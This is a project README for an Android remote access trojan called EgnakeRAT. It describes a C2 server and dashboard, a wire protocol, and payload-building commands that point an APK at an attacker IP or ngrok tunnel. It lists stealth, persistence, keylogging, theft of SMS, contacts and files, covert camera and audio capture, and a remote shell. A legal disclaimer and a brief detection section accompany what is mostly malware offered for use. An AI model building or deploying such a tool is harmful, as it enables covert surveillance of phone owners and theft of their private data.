<div align="center">

```
 ╔══════════════════════════════════════════════════════════════════════════════╗
 ║ ███████╗ ██████╗ ███╗   ██╗ █████╗ ██╗  ██╗███████╗██████╗  █████╗ ████████╗ ║
 ║ ██╔════╝██╔════╝ ████╗  ██║██╔══██╗██║ ██╔╝██╔════╝██╔══██╗██╔══██╗╚══██╔══╝ ║
 ║ █████╗  ██║  ███╗██╔██╗ ██║███████║█████╔╝ █████╗  ██████╔╝███████║   ██║    ║
 ║ ██╔══╝  ██║   ██║██║╚██╗██║██╔══██║██╔═██╗ ██╔══╝  ██╔══██╗██╔══██║   ██║    ║
 ║ ███████╗╚██████╔╝██║ ╚████║██║  ██║██║  ██╗███████╗██║  ██║██║  ██║   ██║    ║
 ║ ╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝    ║
 ╚══════════════════════════════════════════════════════════════════════════════╝
```

**Advanced Android C2 Framework · AES-256 Encrypted · Real-Time Web Dashboard**

[![Python](https://img.shields.io/badge/Python-3.10+-3776AB?style=flat-square&logo=python&logoColor=white)](https://python.org)
[![Platform](https://img.shields.io/badge/Target-Android-3DDC84?style=flat-square&logo=android&logoColor=white)](https://developer.android.com)
[![Encryption](https://img.shields.io/badge/Crypto-AES--256--CBC-red?style=flat-square&logo=letsencrypt&logoColor=white)]()
[![License](https://img.shields.io/badge/License-Educational-yellow?style=flat-square)]()
[![Status](https://img.shields.io/badge/Status-Active-success?style=flat-square)]()

</div>

---

> **⚠️ LEGAL DISCLAIMER — READ BEFORE USE**
>
> EgnakeRAT is a **Remote Administration Tool (RAT)** built strictly for **authorized penetration testing**, **red team operations**, and **academic security research**. Deploying this tool on systems or devices **without explicit written consent** from the owner is **illegal** and may violate laws including but not limited to the **Computer Fraud and Abuse Act (CFAA)**, **GDPR**, and equivalent legislation in your jurisdiction.
>
> **The author assumes no liability for misuse.** By using this software, you agree that you are solely responsible for compliance with all applicable laws. This project is provided as-is for educational purposes only.

---

## Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                        EgnakeRAT                            │
├──────────────────┬──────────────────┬───────────────────────┤
│   C2 TCP Server  │   Web Dashboard  │   Android Client      │
│   (asyncio)      │   (Flask+SIO)    │   (Java/Kotlin)       │
├──────────────────┼──────────────────┼───────────────────────┤
│ StreamReader/    │ REST API         │ Persistent Service    │
│ StreamWriter     │ Socket.IO WS     │ Accessibility Svc     │
│ Coroutine-per-   │ Real-time events │ Auto-reconnect        │
│ connection       │                  │ Stealth mode          │
├──────────────────┴──────────────────┴───────────────────────┤
│                    Shared Layer                             │
│  ┌──────────┐  ┌───────────────┐  ┌───────────────────┐     │
│  │ Protocol │  │ CryptoManager │  │ Database (SQLite) │     │
│  │ JSON+LPF │  │ AES-256-CBC   │  │ WAL mode          │     │
│  └──────────┘  └───────────────┘  └───────────────────┘     │
└─────────────────────────────────────────────────────────────┘
```

## Features

### C2 Server
- **Fully asynchronous** — built on `asyncio.start_server`, handles thousands of concurrent connections with minimal memory
- **AES-256-CBC encrypted** communications with SHA-256 key derivation
- **Length-prefixed JSON protocol** — 4-byte big-endian header + encrypted payload, max 50MB per message
- **Automatic reconnection handling** — stale sessions are cleaned up, old connections gracefully terminated
- **Ngrok tunnel support** — built-in TCP tunneling for external access

### Web Dashboard
- **Real-time device management** via Socket.IO WebSocket events
- **Dark glassmorphism UI** with Lucide icons, Inter/JetBrains Mono typography
- **Modules:** Tactical commands, Remote shell, Keylogger, Screen stream, Notification intercept, File exfiltration, Audit log
- **Payload generator** — configure and patch Android APK directly from the browser
- **Global map** — Leaflet.js powered device geolocation tracking

### Android Client Capabilities
| Category | Commands |
|---|---|
| **Reconnaissance** | `deviceInfo`, `getBatteryStatus`, `getWifiInfo`, `getIP`, `getMACAddress`, `getSimDetails`, `getInstalledApps`, `getClipData` |
| **Surveillance** | `getLocation`, `getSMS`, `getCallLogs`, `getContacts`, `getNotifications` |
| **Media** | `camList`, `takepic`, `screenshot`, `startAudio/stopAudio`, `startVideo/stopVideo` |
| **Live Interaction** | `startScreenStream/stopScreenStream`, `makeCall`, `sendSMS`, `openUrl`, `showToast`, `vibrate`, `lockScreen` |
| **Shell & Files** | `shell`, `shellCmd`, `fileList`, `fileDownload`, `fileUpload`, `fileDelete` |
| **Accessibility** | `startKeylogger/stopKeylogger`, `readScreen`, `performAction`, `checkAccessibility`, `enableAccessibility` |

### Wire Protocol

```
┌────────────┬──────────────────────────────────┐
│ 4 bytes    │ N bytes                          │
│ Length (BE)│ AES-256-CBC(JSON payload)        │
└────────────┴──────────────────────────────────┘
```

Every message is a JSON object with a `type` field. The payload is encrypted with AES-256-CBC (random IV prepended), then base64-encoded, then length-prefixed with a 4-byte big-endian integer.

**Handshake flow:**
1. Client connects via TCP
2. Client sends `handshake` message with `device_id`, `model`, `android_version`, `key_hash`
3. Server verifies `key_hash` matches `MD5(SHA256(passphrase))`
4. Server responds with `handshake_ack`
5. Client enters heartbeat loop, server can issue commands at any time

## Setup

### Requirements
- Python 3.10+
- Android Studio (for APK building)

### Installation

```bash
git clone https://github.com/user/EgnakeRAT.git
cd EgnakeRAT
pip install -r requirements.txt
```

### Start the C2 Server

```bash
# Default: C2 on port 8000, Dashboard on port 8080
python EgnakeRAT.py server

# Custom ports
python EgnakeRAT.py server -p 9000 -w 3000

# With ngrok tunnel (for external access)
python EgnakeRAT.py server --ngrok

# Custom encryption key
python EgnakeRAT.py server -k "YourSecurePassphrase"
```

Access the dashboard at `http://localhost:8080`

### Build the Android Payload

```bash
# Configure APK with target IP and port
python EgnakeRAT.py build -i 192.168.1.100 -p 8000

# With ngrok
python EgnakeRAT.py build --ngrok

# Custom encryption key
python EgnakeRAT.py build -i 10.0.0.5 -p 8000 -k "YourSecurePassphrase"
```

Then open `Android_Code/` in Android Studio and run `Build → Generate Signed APK` or:
```bash
cd Android_Code && ./gradlew assembleRelease
```

## Project Structure

```
EgnakeRAT/
├── EgnakeRAT.py              # Entry point (server + build CLI)
├── requirements.txt
├── server/
│   ├── c2_server.py           # Async TCP C2 server + client handler
│   ├── protocol.py            # Wire protocol constants + pack/unpack
│   ├── crypto.py              # AES-256-CBC encryption engine
│   ├── database.py            # SQLite database (WAL mode)
│   ├── logger.py              # Rich console + file logging
│   └── web/
│       ├── app.py             # Flask + Socket.IO web dashboard
│       ├── static/
│       │   ├── css/dashboard.css
│       │   └── js/dashboard.js
│       └── templates/
│           └── index.html
├── Android_Code/              # Android client source (Java)
├── Dumps/                     # Exfiltrated files (per-device dirs)
└── logs/                      # Server logs (daily rotation)
```

## Database Schema

| Table | Purpose |
|---|---|
| `devices` | Device registry (model, OS, IP, battery, WiFi, online status) |
| `command_history` | Full command audit trail with timestamps |
| `files` | Metadata for exfiltrated files |
| `sessions` | Connection sessions with connect/disconnect timestamps |
| `keylogs` | Captured keystrokes by application |
| `notifications` | Intercepted device notifications |

## Defense & Detection

Understanding how this tool operates is essential for defensive security:

- **Network indicators** — Persistent TCP connection to a non-standard port with encrypted (non-TLS) traffic
- **Accessibility service abuse** — Monitor which apps request `BIND_ACCESSIBILITY_SERVICE` permission
- **Battery drain patterns** — Screen streaming and continuous keylogging increase power consumption
- **APK analysis** — Hardcoded C2 IP/port and AES key can be extracted via static analysis of the APK

This project is released for **educational and authorized security research purposes only**. No warranty is provided. Use at your own risk and responsibility.
